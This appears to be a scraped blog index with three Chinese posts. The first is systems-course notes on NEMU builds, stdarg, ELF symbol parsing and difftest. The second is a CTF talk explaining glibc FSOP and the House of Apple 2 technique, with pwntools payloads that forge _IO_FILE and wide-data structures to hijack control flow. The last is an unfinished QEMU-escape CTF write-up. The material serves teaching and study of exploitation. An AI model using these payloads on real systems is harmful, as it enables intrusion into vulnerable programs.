 _etext = .;\n  .rodata : {\n    *(.rodata*)\n  }\n  .data : {\n    *(.data)\n  } : data\n  edata = .;\n  _data = .;\n  .bss : {\n\t_bss_start = .;\n    *(.bss*)\n    *(.sbss*)\n    *(.scommon)\n  }\n  _stack_top = ALIGN(0x1000);\n  . = _stack_top + 0x8000;\n  _stack_pointer = .;\n  end = .;\n  _end = .;\n  _heap_start = ALIGN(0x1000);\n}\n阅读 Makefile\nCheck environment and arguments:\n### Override checks when `make clean/clean-all/html`\nifeq ($(findstring $(MAKECMDGOALS),clean|clean-all|html),)\n\n### Print build info message\n$(info # Building $(NAME)-$(MAKECMDGOALS) [$(ARCH)])\n\n//...\n\n### Check: environment variable `$ARCH` must be in the supported list\nARCHS = $(basename $(notdir $(shell ls $(AM_HOME)/scripts/*.mk)))\nifeq ($(filter $(ARCHS), $(ARCH)), )\n  $(error Expected $$ARCH in {$(ARCHS)}, Got \"$(ARCH)\")\nendif\n\n### Checks end here\nendif\nInclude AM makefile specified by $(ARCH):\n-include $(AM_HOME)/scripts/$(ARCH).mk\n​ in $(ARCH).mk,\n​ it includes nemu.mk, which builds NEMU related driver\nand runs NEMU.\n​ it also includes another arch related .mk that overwrites\nARCH_H.\ninclude $(AM_HOME)/scripts/isa/riscv.mk\ninclude $(AM_HOME)/scripts/platform/nemu.mk\nCFLAGS  += -DISA_H=\\\"riscv/riscv.h\\\"\n\nAM_SRCS += riscv/nemu/start.S \\\n           riscv/nemu/cte.c \\\n           riscv/nemu/trap.S \\\n           riscv/nemu/vme.c\nDefine compilation rule:\n## 5. Compilation Rules\n\n### Rule (compile): a single `.c` -&gt; `.o` (gcc)\n$(DST_DIR)/%.o: %.c\n\t@mkdir -p $(dir $@) &amp;&amp; echo + CC $&lt;\n\t@$(CC) -std=gnu11 $(CFLAGS) -c -o $@ $(realpath $&lt;)\n\n### Rule (compile): a single `.cc` -&gt; `.o` (g++)\n$(DST_DIR)/%.o: %.cc\n\t@mkdir -p $(dir $@) &amp;&amp; echo + CXX $&lt;\n\t@$(CXX) -std=c++17 $(CXXFLAGS) -c -o $@ $(realpath $&lt;)\n\n### Rule (compile): a single `.cpp` -&gt; `.o` (g++)\n$(DST_DIR)/%.o: %.cpp\n\t@mkdir -p $(dir $@) &amp;&amp; echo + CXX $&lt;\n\t@$(CXX) -std=c++17 $(CXXFLAGS) -c -o $@ $(realpath $&lt;)\n\n### Rule (compile): a single `.S` -&gt; `.o` (gcc, which preprocesses and calls as)\n$(DST_DIR)/%.o: %.S\n\t@mkdir -p $(dir $@) &amp;&amp; echo + AS $&lt;\n\t@$(AS) $(ASFLAGS) -c -o $@ $(realpath $&lt;)\n\n### Rule (recursive make): build a dependent library (am, klib, ...)\n$(LIBS): %:\n\t@$(MAKE) -s -C $(AM_HOME)/$* archive\n\n### Rule (link): objects (`*.o`) and libraries (`*.a`) -&gt; `IMAGE.elf`, the final ELF binary to be packed into image (ld)\n$(IMAGE).elf: $(LINKAGE) $(LDSCRIPTS)\n\t@echo \\# Creating image [$(ARCH)]\n\t@echo + LD \"-&gt;\" $(IMAGE_REL).elf\nifneq ($(filter $(ARCH),native),)\n\t@$(CXX) -o $@ -Wl,--whole-archive $(LINKAGE) -Wl,-no-whole-archive $(LDFLAGS_CXX)\nelse\n\t@$(LD) $(LDFLAGS) -o $@ --start-group $(LINKAGE) --end-group\nendif\n\n### Rule (archive): objects (`*.o`) -&gt; `ARCHIVE.a` (ar)\n$(ARCHIVE): $(OBJS)\n\t@echo + AR \"-&gt;\" $(shell realpath $@ --relative-to .)\n\t@$(AR) rcs $@ $^\n\n### Rule (`#include` dependencies): paste in `.d` files generated by gcc on `-MMD`\n-include $(addprefix $(DST_DIR)/, $(addsuffix .d, $(basename $(SRCS))))\nBuild the project in order below\nimage: image-dep\narchive: $(ARCHIVE)\nimage-dep: $(LIBS) $(IMAGE).elf\n.NOTPARALLEL: image-dep\n.PHONY: image image-dep archive run $(LIBS)\n# Building add-run [riscv64-nemu]\n# Building am-archive [riscv64-nemu]\n# Building klib-archive [riscv64-nemu]\n+ CC tests/add.c\n# Creating image [riscv64-nemu]\n+ LD -&gt; build/add-riscv64-nemu.elf\n+ OBJCOPY -&gt; build/add-riscv64-nemu.bin\n实现常用的库函数\nstdarg 是如何实现的？\n在\n参考 GNU/gcc-15.2.0 中 i386 的实现：\n计算固定参数的大小\n//gcc-15.2.0/gcc/config/i386/i386.cc\n\n  /* Count number of gp and fp argument registers used.  */\n  words = crtl-&gt;args.info.words;\n  n_gpr = crtl-&gt;args.info.regno;\n  n_fpr = crtl-&gt;args.info.sse_regno;\n\n  if (cfun-&gt;va_list_gpr_size)\n    {\n      type = TREE_TYPE (gpr);\n      t = build2 (MODIFY_EXPR, type,\n\t\t  gpr, build_int_cst (type, n_gpr * 8));\n      TREE_SIDE_EFFECTS (t) = 1;\n      expand_expr (t, const0_rtx, VOIDmode, EXPAND_NORMAL);\n    }\n\n  if (TARGET_SSE &amp;&amp; cfun-&gt;va_list_fpr_size)\n    {\n      type = TREE_TYPE (fpr);\n      t = build2 (MODIFY_EXPR, type, fpr,\n\t\t  build_int_cst (type, n_fpr * 16 + 8*X86_64_REGPARM_MAX));\n      TREE_SIDE_EFFECTS (t) = 1;\n      expand_expr (t, const0_rtx, VOIDmode, EXPAND_NORMAL);\n    }\n处理栈上的 overflow area, register save area.\n /* Find the overflow area.  */\n type = TREE_TYPE (ovf);\n if (cfun-&gt;machine-&gt;split_stack_varargs_pointer == NULL_RTX)\n   ovf_rtx = crtl-&gt;args.internal_arg_pointer;\n else\n   ovf_rtx = cfun-&gt;machine-&gt;split_stack_varargs_pointer;\n t = make_tree (type, ovf_rtx);\n if (words != 0)\n   t = fold_build_pointer_plus_hwi (t, words * UNITS_PER_WORD);\n\n t = build2 (MODIFY_EXPR, type, ovf, t);\n TREE_SIDE_EFFECTS (t) = 1;\n expand_expr (t, const0_rtx, VOIDmode, EXPAND_NORMAL);\n\n if (ix86_varargs_gpr_size || ix86_varargs_fpr_size)\n   {\n     /* Find the register save area.\n Prologue of the function save it right above stack frame.  */\n     type = TREE_TYPE (sav);\n     t = make_tree (type, frame_pointer_rtx);\n     if (!ix86_varargs_gpr_size)\nt = fold_build_pointer_plus_hwi (t, -8 * X86_64_REGPARM_MAX);\n\n     t = build2 (MODIFY_EXPR, type, sav, t);\n     TREE_SIDE_EFFECTS (t) = 1;\n     expand_expr (t, const0_rtx, VOIDmode, EXPAND_NORMAL);\n   }\n基础设施 (2)\n指令环形缓冲区 - iringbuf\n实现一个环形缓冲区，每次执行指令时写入即可\ntypedef struct\n{\n  char buf[10][128];\n  int head;\n  int tail;\n} LogRingbuf;\n\nIFDEF(CONFIG_ITRACE, LogRingbuf ringbuf);\n\nvoid ringbuf_push(LogRingbuf *r, const char* log) {\n  strcpy(r-&gt;buf[r-&gt;head], log);\n  r-&gt;head = (r-&gt;head+1) % 10;\n  if(r-&gt;head == r-&gt;tail) r-&gt;tail = (r-&gt;tail+1) % 10;\n}\n\nvoid ringbuf_puts(LogRingbuf *r) {\n  for(int i = r-&gt;tail; i!=r-&gt;head; i = (i+1)%10) {\n    printf(\"%s\\n\", r-&gt;buf[i]);\n  }\n}\n函数调用的踪迹 - ftrace\n偷懒了，并没有完全实现（\n先读取传入的 ELF:\n#include &lt;common.h&gt;\n#include &lt;elf.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid init_ftrace(const char* elf) {\n  Elf64_Ehdr elf_header;\n  FILE *fp = fopen(elf, \"rb\");\n  if (fp == NULL) {\n    printf(\"Failed to open file %s\\n\", elf);\n    return;\n  }\n  size_t count = fread(&amp;elf_header, 1, sizeof(Elf64_Ehdr), fp);\n  assert(count == sizeof(Elf64_Ehdr));\n\n  parse_symbols(fp, &amp;elf_header);\n}\n根据 ELF 的结构，我们先读取 Elf64_Ehdr:\n\n\nELF\n\nELF header (Ehdr)\n    The ELF header is described by the type Elf32_Ehdr or Elf64_Ehdr:\n\n        #define EI_NIDENT 16\n\n        typedef struct {\n            unsigned char e_ident[EI_NIDENT];\n            uint16_t      e_type;\n            uint16_t      e_machine;\n            uint32_t      e_version;\n            ElfN_Addr     e_entry;\n            ElfN_Off      e_phoff;\n            ElfN_Off      e_shoff;\n            uint32_t      e_flags;\n            uint16_t      e_ehsize;\n            uint16_t      e_phentsize;\n            uint16_t      e_phnum;\n            uint16_t      e_shentsize;\n            uint16_t      e_shnum;\n            uint16_t      e_shstrndx;\n        } ElfN_Ehdr;\n解析具体的符号表，并维护一个单向链表：\nvoid parse_symbols(FILE *fp, Elf64_Ehdr *elf_header) {\n  Elf64_Shdr *sh_table = malloc(elf_header-&gt;e_shnum * sizeof(Elf64_Shdr));\n  fseek(fp, elf_header-&gt;e_shoff, SEEK_SET);\n  size_t ret = fread(sh_table, sizeof(Elf64_Shdr), elf_header-&gt;e_shnum, fp);\n  assert(ret == elf_header-&gt;e_shnum);\n\n  Elf64_Shdr *symtab_shdr = NULL;\n  Elf64_Shdr *strtab_shdr = NULL;\n\n  for (int i = 0; i &lt; elf_header-&gt;e_shnum; i++) {\n    if (sh_table[i].sh_type == SHT_SYMTAB) {\n      symtab_shdr = &amp;sh_table[i];\n      if (symtab_shdr-&gt;sh_link &lt; elf_header-&gt;e_shnum) {\n        strtab_shdr = &amp;sh_table[symtab_shdr-&gt;sh_link];\n      }\n      break;\n    }\n  }\n\n  if (!symtab_shdr || !strtab_shdr) {\n    printf(\"Symbol table or string table not found.\\n\");\n    free(sh_table);\n    return;\n  }\n\n  Elf64_Sym *sym_table = malloc(symtab_shdr-&gt;sh_size);\n  fseek(fp, symtab_shdr-&gt;sh_offset, SEEK_SET);\n  ret = fread(sym_table, symtab_shdr-&gt;sh_size, 1, fp);\n  assert(ret == 1);\n\n  char *strtab = malloc(strtab_shdr-&gt;sh_size);\n  fseek(fp, strtab_shdr-&gt;sh_offset, SEEK_SET);\n  ret = fread(strtab, strtab_shdr-&gt;sh_size, 1, fp);\n  assert(ret == 1);\n\n\n  int num_symbols = symtab_shdr-&gt;sh_size / sizeof(Elf64_Sym);\n  //printf(\"Parsing %d symbols...\\n\", num_symbols);\n\n  for (int i = 0; i &lt; num_symbols; i++) {\n    const char *symbol_name = &amp;strtab[sym_table[i].st_name];\n    Elf64_Addr symbol_addr = sym_table[i].st_value;\n    unsigned char symbol_type = ELF64_ST_TYPE(sym_table[i].st_info);\n\n    if (symbol_type == STT_FUNC) {\n//      printf(\"Found function: %s at address 0x%lx\\n\", symbol_name, symbol_addr);\n      ftrace_append(symbol_name, symbol_addr);\n    }\n  }\n\n  free(sh_table);\n  free(sym_table);\n  free(strtab);\n}\nSection header 中存放了各个 section 的信息\nSection header (Shdr)\n    A file's section header table lets one locate all the file's sections.  The section header table is an array of Elf32_Shdr or Elf64_Shdr structures.  The ELF\n    header's e_shoff member gives the byte offset from the beginning of the file to the section header table.  e_shnum holds the number of  entries  the  section\n    header table contains.  e_shentsize holds the size in bytes of each entry.\n\n    A  section  header  table  index  is  a subscript into this array.  Some section header table indices are reserved: the initial entry and the indices between\n    SHN_LORESERVE and SHN_HIRESERVE.  The initial entry is used in ELF extensions for e_phnum, e_shnum, and e_shstrndx; in other cases, each field in the initial\n    entry is set to zero.  An object file does not have sections for these special indices:\n\n    SHN_UNDEF\n           This value marks an undefined, missing, irrelevant, or otherwise meaningless section reference.\n\n    SHN_LORESERVE\n           This value specifies the lower bound of the range of reserved indices.\n\n    SHN_LOPROC\n    SHN_HIPROC\n           Values greater in the inclusive range [SHN_LOPROC, SHN_HIPROC] are reserved for processor-specific semantics.\n\n    SHN_ABS\n           This value specifies the absolute value for the corresponding reference.  For example, a symbol defined relative to section number SHN_ABS has an  ab‐\n           solute value and is not affected by relocation.\n\n    SHN_COMMON\n           Symbols defined relative to this section are common symbols, such as FORTRAN COMMON or unallocated C external variables.\n\n    SHN_HIRESERVE\n           This  value  specifies  the upper bound of the range of reserved indices.  The system reserves indices between SHN_LORESERVE and SHN_HIRESERVE, inclu‐\n           sive.  The section header table does not contain entries for the reserved indices.\n\nElf64_Sym 的定义如下:\n  String and symbol tables\n      String table sections hold null-terminated character sequences, commonly called strings. The ob‐\n      ject file uses these strings to represent symbol and section names. One references a string as\n      an index into the string table section.  The first byte, which is index zero, is defined to  hold\n      a null byte ('\\0'). Similarly, a string table's last byte is defined to hold a null byte, ensur‐\n      ing null termination for all strings.\n\n      An  object file's symbol table holds information needed to locate and relocate a program's sym‐\n      bolic definitions and references. A symbol table index is a subscript into this array.\n\ntypedef struct {\n              uint32_t      st_name;\n              //This member holds an index into the object file's symbol string table, which holds character representations of the symbol names. If the value is nonzero, it represents a string table index that gives the symbol name. Otherwise, the symbol has no name.\n              unsigned char st_info;\n              unsigned char st_other;\n              uint16_t      st_shndx;\n              Elf64_Addr    st_value;\n              uint64_t      st_size;\n          } Elf64_Sym;\n\n后面遇到 jal 等跳转指令查找这个链表，计算偏移就可以了。\nDifferential Testing\n框架已经实现好了相应的接口，实现一下比较寄存器的值\nbool isa_difftest_checkregs(CPU_state *ref_r, vaddr_t pc) {\n  bool ok = true;\nfor(int i=0;i&lt;32;i++) {\n  if(ref_r-&gt;gpr[i] != cpu.gpr[i]) {\n    printf(\"\\n [difftest] inequal reg value in %s: 0x%lx\\n\", regs[i], ref_r-&gt;gpr[i]);\n    ok = false;\n  }\n}\n  if(ref_r-&gt;pc != cpu.pc) {\n    printf(\"\\n [difftest] inequal pc: 0x%lx\\n\",ref_r-&gt;pc);\n    ok = false;\n  }\n  return ok;\n}\n输入输出\n实现需要的 IOE 功能都比较简单，这里在跑 microbench 的时候遇到了一个比较怪的问题。\ndifftest 提示\nReferences\n\nhttps://lf-riscv.atlassian.net/wiki/spaces/HOME/pages/16154769/RISC-V+Technical+Specifications#ISA-Specifications\nhttps://gcc.gnu.org/onlinedocs/gcc-15.1.0/gcc.pdf\nhttps://elixir.bootlin.com/glibc/glibc-2.42.9000/source\nhttps://gist.github.com/x0nu11byt3/bcb35c3de461e5fb66173071a2379779#file-elf_format_cheatsheet-md\n\n","categories":["Study"],"tags":["ICS"]},{"title":"Vidar 分享会 - FSOP","url":"/categories/CTF/vidarshare-fsop/","content":"I. FSOP\n\nFSOP 是 File Stream Oriented Programming 的缩写。\nFSOP 的核心思想就是劫持\n_IO_list_all 的值来伪造链表和其中的\n_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP\n选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个\nFILE 调用\nfflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。\n\n\nII. RTFSC\n下面我将以 glibc-2.39 源码为例，分析 FSOP 的一个实际应用 ---House of\nApple (2)1 涉及的原理。\n_IO_FILE\n/libio/bits/types/struct_FILE.h 中有如下定义：\nstruct _IO_FILE\n{\n  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  char *_IO_read_ptr;\t/* Current read pointer */\n  char *_IO_read_end;\t/* End of get area. */\n  char *_IO_read_base;\t/* Start of putback+get area. */\n  char *_IO_write_base;\t/* Start of put area. */\n  char *_IO_write_ptr;\t/* Current put pointer. */\n  char *_IO_write_end;\t/* End of put area. */\n  char *_IO_buf_base;\t/* Start of reserve area. */\n  char *_IO_buf_end;\t/* End of reserve area. */\n\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n  int _flags2;\n  __off_t _old_offset; /* This used to be _offset but it's too small.  */\n\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};\n\nstruct _IO_FILE_complete\n{\n  struct _IO_FILE _file;\n#endif\n  __off64_t _offset;\n  /* Wide character stream stuff.  */\n  struct _IO_codecvt *_codecvt;\n  struct _IO_wide_data *_wide_data;\n  struct _IO_FILE *_freeres_list;\n  void *_freeres_buf;\n  size_t __pad5;\n  int _mode;\n  /* Make sure we don't get into trouble again.  */\n  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];\n};\n使用 gdb，可以得到其成员的相对偏移：\n\n\nimg\n\nExit () 调用过程\n__run_exit_handlers()\nexit() 在 /stdlib/exit.c 有定义:\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;pointer_guard.h&gt;\n#include &lt;libc-lock.h&gt;\n#include &lt;set-freeres.h&gt;\n#include \"exit.h\"\n\n/* Initialize the flag that indicates exit function processing\n   is complete. See concurrency notes in stdlib/exit.h where\n   __exit_funcs_lock is declared.  */\nbool __exit_funcs_done = false;\n\n/* Call all functions registered with `atexit' and `on_exit',\n   in the reverse of the order in which they were registered\n   perform stdio cleanup, and terminate program execution with STATUS.  */\nvoid\nattribute_hidden\n__run_exit_handlers (int status, struct exit_function_list **listp,\n\t\t     bool run_list_atexit, bool run_dtors)\n{\n  /* First, call the TLS destructors.  */\n  if (run_dtors)\n    call_function_static_weak (__call_tls_dtors);\n\n  __libc_lock_lock (__exit_funcs_lock);\n\n  /* We do it this way to handle recursive calls to exit () made by\n     the functions registered with `atexit' and `on_exit'. We call\n     everyone on the list and use the status value in the last\n     exit (). */\n  while (true)\n    {\n      struct exit_function_list *cur;\n\n    restart:\n      cur = *listp;\n\n      if (cur == NULL)\n\t{\n\t  /* Exit processing complete.  We will not allow any more\n\t     atexit/on_exit registrations.  */\n\t  __exit_funcs_done = true;\n\t  break;\n\t}\n\n      while (cur-&gt;idx &gt; 0)\n\t{\n\t  struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];\n\t  const uint64_t new_exitfn_called = __new_exitfn_called;\n\n\t  switch (f-&gt;flavor)\n\t    {\n\t      void (*atfct) (void);\n\t      void (*onfct) (int status, void *arg);\n\t      void (*cxafct) (void *arg, int status);\n\t      void *arg;\n\n\t    case ef_free:\n\t    case ef_us:\n\t      break;\n\t    case ef_on:\n\t      onfct = f-&gt;func.on.fn;\n\t      arg = f-&gt;func.on.arg;\n\t      PTR_DEMANGLE (onfct);\n\n\t      /* Unlock the list while we call a foreign function.  */\n\t      __libc_lock_unlock (__exit_funcs_lock);\n\t      onfct (status, arg);\n\t      __libc_lock_lock (__exit_funcs_lock);\n\t      break;\n\t    case ef_at:\n\t      atfct = f-&gt;func.at;\n\t      PTR_DEMANGLE (atfct);\n\n\t      /* Unlock the list while we call a foreign function.  */\n\t      __libc_lock_unlock (__exit_funcs_lock);\n\t      atfct ();\n\t      __libc_lock_lock (__exit_funcs_lock);\n\t      break;\n\t    case ef_cxa:\n\t      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),\n\t\t we must mark this function as ef_free.  */\n\t      f-&gt;flavor = ef_free;\n\t      cxafct = f-&gt;func.cxa.fn;\n\t      arg = f-&gt;func.cxa.arg;\n\t      PTR_DEMANGLE (cxafct);\n\n\t      /* Unlock the list while we call a foreign function.  */\n\t      __libc_lock_unlock (__exit_funcs_lock);\n\t      cxafct (arg, status);\n\t      __libc_lock_lock (__exit_funcs_lock);\n\t      break;\n\t    }\n\n\t  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))\n\t    /* The last exit function, or another thread, has registered\n\t       more exit functions.  Start the loop over.  */\n\t    goto restart;\n\t}\n\n      *listp = cur-&gt;next;\n      if (*listp != NULL)\n\t/* Don't free the last element in the chain, this is the statically\n\t   allocate element.  */\n\tfree (cur);\n    }\n\n  __libc_lock_unlock (__exit_funcs_lock);\n\n  if (run_list_atexit)\n    call_function_static_weak (_IO_cleanup);\n\n  _exit (status);\n}\n\n\nvoid\nexit (int status)\n{\n  __run_exit_handlers (status, &amp;__exit_funcs, true, true);\n}\nlibc_hidden_def (exit)\n\n_IO_cleanup()\n在__run_exit_handlers 中调用了_IO_cleanup，它在 /libio/genops.c 中有定义:\nint\n_IO_cleanup (void)\n{\n  int result = _IO_flush_all ();\n\n  /* We currently don't have a reliable mechanism for making sure that\n     C++ static destructors are executed in the correct order.\n     So it is possible that other static destructors might want to\n     write to cout - and they're supposed to be able to do so.\n\n     The following will make the standard streambufs be unbuffered,\n     which forces any output from late destructors to be written out. */\n  _IO_unbuffer_all ();\n\n  return result;\n}\n_IO_flush_all()\n同样在这个文件中，可以找到_IO_flush_all:\nint\n_IO_flush_all (void)\n{\n  int result = 0;\n  FILE *fp;\n\n#ifdef _IO_MTSAFE_IO\n  _IO_cleanup_region_start_noarg (flush_cleanup);\n  _IO_lock_lock (list_all_lock);\n#endif\n\n  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)\n    {\n      run_fp = fp;\n      _IO_flockfile (fp);\n\n      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n       || (_IO_vtable_offset (fp) == 0\n           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n       )\n      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n    result = EOF;\n\n      _IO_funlockfile (fp);\n      run_fp = NULL;\n    }\n\n#ifdef _IO_MTSAFE_IO\n  _IO_lock_unlock (list_all_lock);\n  _IO_cleanup_region_end (0);\n#endif\n\n  return result;\n}\nvoid\n_cthreads_flockfile (FILE *fp)\n{\n  _IO_lock_lock (*fp-&gt;_lock);\n}\n\n// ...\n\nvoid _IO_flockfile (FILE *)\n     __attribute__ ((alias (\"_cthreads_flockfile\")));\n\n// ...\n_IO_FILE_plus 在 /libio/stdfiles.c 有定义\n主要关注这个函数中的判断条件，如果前面的条件满足，会进入_IO_OVERFLOW (fp, EOF)，这是一个宏定义，位于 /libio/libioP.h：\n/* Type of MEMBER in struct type TYPE.  */\n#define _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)\n\n/* Essentially ((TYPE *) THIS)-&gt;MEMBER, but avoiding the aliasing\n   violation in case THIS has a different pointer type.  */\n#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \\\n  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \\\n\t\t\t\t       + offsetof(TYPE, MEMBER)))\n//...\n#define _IO_JUMPS_FILE_plus(THIS) \\\n  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)\n//...\n# define _IO_JUMPS_FUNC(THIS) \\\n  (IO_validate_vtable                                                   \\\n   (*(struct _IO_jump_t **) ((void  +*) &amp;_IO_JUMPS_FILE_plus (THIS)\t\\\n\t\t\t     + (THIS)-&gt;_vtable_offset)))\t\n//...\n#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)\n//...\n#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)\n//...\nIO_validate_vtable (const struct _IO_jump_t *vtable)\n{\n  uintptr_t ptr = (uintptr_t) vtable;\n  uintptr_t offset = ptr - (uintptr_t) &amp;__io_vtables;\n  if (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))\n    /* The vtable pointer is not in the expected section.  Use the\n       slow path, which will terminate the process if necessary.  */\n    _IO_vtable_check ();\n  return vtable;\n}\n如果通过合法性检查，那么会执行_vtable-&gt;__overflow\n#define JUMP_FIELD(TYPE, NAME) TYPE NAME\n//...\nstruct _IO_jump_t\n{\n//...\n    JUMP_FIELD(_IO_overflow_t, __overflow);\n//...\n}\n这里__overflow 是_IO_jump_t vtable 中的虚函数，这是 GLIBC 中实现 I/O 多态的核心机制\nvtable2\n通过虚函数表（vtable）为不同类型的文件流（如文件、内存流、字符串流）提供统一的接口，同时允许不同流类型自定义底层操作（如读、写、缓冲区管理）。\n我们可以在 /libio/vtables.c 中找到相关的定义。\nconst struct _IO_jump_t __io_vtables[] attribute_relro =\n{\n  /* _IO_str_jumps  */\n  [IO_STR_JUMPS] =\n  {\n\tJUMP_INIT_DUMMY,\n    JUMP_INIT (finish, _IO_str_finish),\n  //...\n  },\n  [IO_WSTR_JUMPS] = {\n\tJUMP_INIT_DUMMY,\n    JUMP_INIT (finish, _IO_wstr_finish),\n  //...\n  },\n  //...\n}\n也就是说，__overflow\n实际是执行__io_vtables 中已定义的相关函数。如 finish，会根据不同 I/O 类型执行不同函数，例如 [IO_STR_JUMPS] 中指向_IO_str-finish；[IO_WSTR_JUMPS] 中指向_IO_wstr_finish。\nIII. House of Apple\n在上一节中，我们知道在_IO_JUMPS_FUNC(THIS) 这个宏中验证了 const struct _IO_jump_t *vtable 是否是合法的：即它指向的地址是否在__io_vtables 的范围内。这也让我们不能通过直接伪造 vtable 来控制程序执行流。\n然而，我们仍有机会修改 vtable 为不同的合法虚表。这导致了后续函数执行过程中存在可利用的漏洞。\n构造_IO_FILE_plus\n使用 House of Apple 的前提是 Large bin\nattack，它将一个堆地址写在任意地址处。\n这里将 &amp;_IO_list_all 处写可控堆地址，然后开始伪造_IO_FILE_plus。\n由于 Large bin\nattack 是把堆的头部 prev_size 地址写入，而一般我们只能从 fd 域开始编辑，所以下文的伪造会从 fd 开始。\nfake_io = flat({\n\t0x18:[\n\t\tp64(1) # _IO_write_ptr [fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base]\n\t],\n\t0x60:[\n\t\tp32(0) # _fileno\n\t],\n\t0x78:[\n\t\tp64(_IO_stdfile_2_lock) # *_lock [_IO_flockfile (fp);]\n\t],\n\t0xb0:[\n\t\tp32(0xFFFFFFFF) # _mode [fp-&gt;_mode &lt;= 0]\n\t]\n})\n_wide_data 调用链\n尽管无法直接通过修改 vtable 控制执行流，但是_wide_data-&gt;_wide_vtable 在执行时缺少安全检查。\n因此我们可以构造如下调用链，其中涉及到的方法和宏可自行查阅：\n_IO_OVERFLOW (fp, EOF)-&gt;\n(_IO_overflow_t) _IO_wfile_overflow-&gt;\n_IO_wdoallocbuf (f)-&gt;\n_IO_WDOALLOCATE (fp)-&gt;\nBackdoor(fp) # fake vtable points at\n构造_wide_data,\n_wide_vtable\n为了使用上面的调用链，需要修改 *_wide_data 到我们伪造的_IO_wide_data。\n这里有一个巧妙的处理，我们可以将其指向之前伪造的_IO_FILE_plus 处，因为_IO_wide_data 中部分成员是与_IO_FILE 相同的。\n然后在_wide_data-&gt;_wide_vtable 处写构造的 vtable 地址。\n\n\n\nimage-20250408193602020\n\n_IO_stdfile_2_lock = libc_base + 0x205700 # find your offset in gdb\nIO_file_addr = heap_base + 0x0d00\nIO_wide_data_addr = IO_file_addr\nwide_vtable_addr = file_addr + 0xe8-0x68 \n\nfake_io = flat({\n\t0x18:[\n\t\tp64(1) # _IO_write_ptr [fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base]\n\t],\n\t0x60:[\n\t\tp32(0) # _fileno\n\t],\n\t0x78:[\n\t\tp64(_IO_stdfile_2_lock) # *_lock [_IO_flockfile (fp);]\n\t],\n\t0x90:[\n\t\tp64(IO_wide_data_addr) # *_wide_data\n\t],\n\t0xb0:[\n\t\tp32(0xFFFFFFFF) # _mode [fp-&gt;_mode &lt;= 0]\n\t],\n\t0xc8:[\n\t\tp64(libc_base+libc.sym['_IO_wfile_jumps']) # vtable\n\t],\n\t0xd0:[\n\t\tp64(wide_vtable_addr)\n\t],\n\t0xd8:[\n\t\tp64(gadget)\n\t]\n})\n这样，就控制了程序执行流，并且 $rdi = &amp;fp。\n对于 House of Apple 的实践，您也可以阅读我的这篇文章：HGAME\n2025 Week 2 Writeup\nReferences\n\n\n\n看雪：House of apple\n一种新的 glibc 中 IO 攻击方法↩︎\n看雪：Pwn 堆利用学习 ——\nFSOP、House of Orange↩︎\n\n\n","categories":["CTF"],"tags":["pwn","FSOP","House of Apple"]},{"title":"QEMU PWN - EasyDMA","url":"/categories/CTF/easydma/","content":"EasyDMA\nFrom: ACTF 2025\n题目给出一个去符号的 qemu 二进制文件\nqemu-system-x86_64，启动参数如下\n#!/bin/sh\ntimeout --foreground 300 ./qemu-system-x86_64 \\\n    -L pc-bios \\\n    -m 1024 \\\n    -kernel bzImage \\\n    -initrd rootfs.cpio \\\n    -drive file=null-co://,if=none,id=mydisk \\\n    -device virtio-blk-pci,drive=mydisk,ioeventfd=off \\\n    -device readflag \\\n    -append \"priority=low console=ttyS0\" \\\n    -monitor /dev/null \\\n    -nographic\n\n添加两个设备 virtio-blk-pci, readflag。\n反汇编可以找到 readflag 通过 mmio 的读、写回调函数：\n__int64 __fastcall readflag_mmio_read(__int64 opaque, unsigned __int64 addr, int size)\n{\n  __int64 result; // rax\n\n  if ( addr &gt; 0x7F )\n  {\n    result = -1LL;\n    if ( size != 4 )\n      return result;\n  }\n  else if ( size != 4 )\n  {\n    result = -1LL;\n    if ( size != 8 )\n      return result;\n  }\n  result = 0xDEADBEEFLL;\n  if ( addr )\n  {\n    if ( addr == 8 )\n      return *(_QWORD *)(opaque + 2984);\n    else\n      return -1LL;\n  }\n  return result;\n}\nvoid __fastcall readflag_mmio_write(__int64 opaque, unsigned __int64 addr, size_t val, int size)\n{\n  void *v4; // rbp\n  FILE *v5; // rax\n  FILE *v6; // r12\n  size_t v7; // rax\n  int v8; // [rsp+0h] 